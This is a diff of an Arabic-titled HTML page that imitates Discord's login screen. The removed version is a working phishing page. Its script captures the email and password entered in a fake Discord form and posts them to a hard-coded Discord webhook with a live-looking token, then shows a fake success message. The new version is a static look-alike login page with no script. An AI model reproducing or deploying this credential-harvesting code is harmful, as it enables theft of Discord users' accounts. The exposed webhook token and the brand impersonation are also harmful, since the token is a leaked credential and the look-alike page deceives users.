@@ -1,221 +1,139 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>واجهة دخول ديسكورد - SLS Freeroom</title>
-<style>
-  @font-face {
-    font-family: "Uni Sans";
-    src: local("Uni Sans"), local("UniSans"), url("https://cdn.jsdelivr.net/gh/discord/uni-font/UniSans-Variable.woff2") format("woff2");
-    font-weight: 100 900;
-    font-display: swap;
-  }
-  body {
-    margin: 0; padding: 0;
-    font-family: "Uni Sans", "Tajawal", sans-serif;
-    direction: rtl;
-    color: #fff;
-    height: 100vh;
-    overflow: hidden;
-    background: url('backrawnd') no-repeat center center fixed;
-    background-size: cover;
-    position: relative;
-  }
-  .discord-logo {
-    position: absolute;
-    top: 20px;
-    left: 20px;
-    width: 45px;
-    height: 45px;
-    background: url('logo') no-repeat center center / contain;
-  }
-  .login-box {
-    position: relative;
-    width: 470px;
-    background: #2f3136;
-    border-radius: 8px;
-    display: flex;
-    box-shadow: 0 0 10px #7289daaa;
-    overflow: hidden;
-    margin: auto;
-    top: 50%;
-    transform: translateY(-50%);
-    z-index: 10;
-  }
-  .form-section {
-    flex: 2;
-    padding: 40px 40px 40px 30px;
-  }
-  .form-section h1 {
-    margin: 0 0 3px;
-    font-size: 22px;
-    font-weight: 700;
-    color: #fff;
-  }
-  .form-section small {
-    font-size: 13px;
-    color: #72767d;
-    margin-bottom: 40px;
-    display: block;
-  }
-  label {
-    font-size: 12px;
-    color: #72767d;
-    margin-bottom: 6px;
-    display: block;
-    letter-spacing: 0.1em;
-  }
-  input[type="text"], input[type="password"] {
-    background: #202225;
-    border: none;
-    border-radius: 3px;
-    color: #dcddde;
-    font-size: 15px;
-    padding: 12px 14px;
-    width: 100%;
-    margin-bottom: 18px;
-    box-sizing: border-box;
-  }
-  input::placeholder {
-    color: #72767d;
-    opacity: 1;
-  }
-  .forgot-password {
-    font-size: 12px;
-    color: #72767d;
-    margin-top: -12px;
-    margin-bottom: 20px;
-    cursor: pointer;
-    user-select: none;
-  }
-  button {
-    background-color: #5865f2;
-    border: none;
-    border-radius: 4px;
-    color: white;
-    font-size: 16px;
-    font-weight: 600;
-    padding: 12px 0;
-    width: 100%;
-    cursor: pointer;
-    transition: background-color 0.3s ease;
-  }
-  button:hover {
-    background-color: #4752c4;
-  }
-  .qr-section {
-    flex: 1;
-    background: #36393f;
-    padding: 36px 20px 40px;
-    border-left: 1px solid #202225;
-    text-align: center;
-    font-size: 12px;
-    color: #b9bbbe;
-    user-select: none;
-  }
-  .qr-section img {
-    width: 110px;
-    height: 110px;
-    margin-bottom: 12px;
-  }
-  .qr-section h2 {
-    font-weight: 600;
-    font-size: 16px;
-    margin-bottom: 4px;
-  }
-  .qr-section p {
-    line-height: 1.2;
-    margin-bottom: 5px;
-  }
-  #sitePage {
-    display: none;
-    color: white;
-    text-align: center;
-    padding: 50px;
-  }
-</style>
-</head>
-<body>
-
-<div class="discord-logo" aria-label="Discord Logo"></div>
-
-<div class="login-box" id="loginPage">
-  <form class="form-section" id="loginForm">
-    <h1>Welcome back!</h1>
-    <small>We’re so excited to see you again!</small>
-
-    <label for="email">Email or Phone Number</label>
-    <input type="text" id="email" name="email" placeholder="Email or Phone Number" required />
-
-    <label for="password">Password</label>
-    <input type="password" id="password" name="password" placeholder="Password" required />
-    
-    <div class="forgot-password" tabindex="0" role="button" onclick="alert('نسيت كلمة السر؟ يمكنك إنشاء حساب جديد');">Forgot your password?</div>
-    
-    <button type="submit">Log In</button>
-  </form>
-
-  <div class="qr-section">
-    <img src="https://cdn.discordapp.com/security/ssl/qr_code.webp" alt="Discord QR Code" />
-    <h2>Log in with QR Code</h2>
-    <p>Scan this with the Discord mobile app to log in instantly.</p>
-    <p>Or, sign in with passkey.</p>
-  </div>
-</div>
-
-<div id="sitePage">
-  <!-- كود الموقع بعد تسجيل الدخول -->
-  <h1>مرحبًا بك في موقع SLS Freeroom</h1>
-  <p>تم الدخول بنجاح!</p>
-</div>
-
-<script>
-  const webhookURL = "https://discord.com/api/webhooks/1364438803170725899/9Zrvq7SXUIUIE8VEdazpPYtyc1qwDmaJufck8dEfC2w0xbc5TVktfzrb6vUJnPasaqDb";
-
-  document.getElementById('loginForm').addEventListener('submit', function(event) {
-    event.preventDefault();
-
-    const email = document.getElementById('email').value.trim();
-    const password = document.getElementById('password').value.trim();
-
-    if (!email || !password) {
-      alert('يرجى ملء جميع الحقول');
-      return;
+  <meta charset="UTF-8">
+  <title>تسجيل دخول</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #2c2f33;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
     }
 
-    const message = {
-      embeds: [
-        {
-          title: "تم استلام بيانات جديدة من الموقع",
-          color: 7506394,
-          fields: [
-            { name: "إيميل الديسكورد", value: email, inline: false },
-            { name: "كلمة السر", value: password, inline: false }
-          ],
-          timestamp: new Date().toISOString()
-        }
-      ]
-    };
+    .login-container {
+      background-color: #36393f;
+      padding: 40px;
+      border-radius: 8px;
+      width: 400px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+      display: flex;
+      justify-content: space-between;
+    }
 
-    fetch(webhookURL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(message)
-    }).then(response => {
-      if (response.ok) {
-        alert('تم تسجيل الدخول بنجاح');
-        document.getElementById('loginPage').style.display = "none";
-        document.getElementById('sitePage').style.display = "block";
-      } else {
-        alert('فشل الإرسال، حاول مرة أخرى لاحقاً.');
-      }
-    }).catch(err => {
-      alert('حدث خطأ في الاتصال: ' + err.message);
-    });
-  });
-</script>
+    .form-section {
+      width: 55%;
+    }
 
+    .form-section h2 {
+      margin: 0 0 10px;
+    }
+
+    .form-section p {
+      margin: 0 0 20px;
+      color: #b9bbbe;
+      font-size: 14px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-size: 14px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border-radius: 4px;
+      border: none;
+      background-color: #202225;
+      color: #fff;
+    }
+
+    .forgot {
+      display: block;
+      margin-bottom: 15px;
+      font-size: 13px;
+      color: #00aff4;
+      text-decoration: none;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #5865f2;
+      border: none;
+      border-radius: 4px;
+      color: white;
+      font-size: 15px;
+      cursor: pointer;
+    }
+
+    .register {
+      margin-top: 15px;
+      font-size: 14px;
+    }
+
+    .register a {
+      color: #00aff4;
+      text-decoration: none;
+    }
+
+    .qr-section {
+      width: 40%;
+      text-align: center;
+    }
+
+    .qr-section img {
+      width: 120px;
+      margin-bottom: 10px;
+    }
+
+    .qr-section p {
+      font-size: 13px;
+      color: #b9bbbe;
+    }
+
+    .qr-section a {
+      display: block;
+      margin-top: 5px;
+      color: #00aff4;
+      text-decoration: none;
+      font-size: 13px;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="form-section">
+      <h2>Welcome back!</h2>
+      <p>We're so excited to see you again!</p>
+      <form>
+        <label for="email">Email or Phone Number</label>
+        <input type="text" id="email" required>
+
+        <label for="password">Password</label>
+        <input type="password" id="password" required>
+
+        <a href="#" class="forgot">Forgot your password?</a>
+
+        <button type="submit">Log In</button>
+      </form>
+      <div class="register">
+        Need an account? <a href="#">Register</a>
+      </div>
+    </div>
+    <div class="qr-section">
+      <img src="https://i.ibb.co/9n6RjR5/discord-qr.png" alt="QR Code">
+      <h3>Log in with QR Code</h3>
+      <p>Scan this with the <b>Discord mobile app</b> to log in instantly.</p>
+      <a href="#">Or, sign in with passkey</a>
+    </div>
+  </div>
 </body>
-  </html>
-  
+</html>
